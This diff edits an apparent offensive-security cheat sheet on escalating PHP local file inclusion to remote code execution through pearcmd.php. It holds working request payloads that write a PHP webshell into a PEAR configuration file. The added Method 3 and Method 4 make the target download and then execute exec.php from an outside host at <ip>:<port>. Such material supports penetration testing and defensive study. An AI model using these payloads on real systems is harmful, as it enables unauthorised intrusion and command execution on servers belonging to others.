@@ -507,7 +507,7 @@ The file `pearcmd.php` uses `$_SERVER['argv']` to get its arguments. The directi
 register_argc_argv = On
 ```
 
-There are two ways to exploit it.
+There are this ways to exploit it.
 
 * Method 1: config create
   ```ps1
@@ -516,16 +516,31 @@ There are two ways to exploit it.
   ```
 * Method 2: man_dir
   ```ps1
-  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+"
+  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
   /vuln.php?file=/tmp/exec.php&c=id
   ```
+  The created configuration file contains the webshell.
+  ```php
+  #PEAR_Config 0.9
+  a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
+  ```
 
-The created configuration file contains the webshell.
-
-```php
-#PEAR_Config 0.9
-a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
-```
+* Method 3: download
+  
+  Need external network connection.
+  ```ps1
+  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
+  /vuln.php?file=exec.php&c=id
+  ```
+* Method 4: install
+  
+  Need external network connection.
+  
+  Notice that `exec.php` locates at `/tmp/pear/download/exec.php`.
+  ```ps1
+  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
+  /vuln.php?file=/tmp/pear/download/exec.php&c=id
+  ```
 
 
 ## LFI to RCE via credentials files
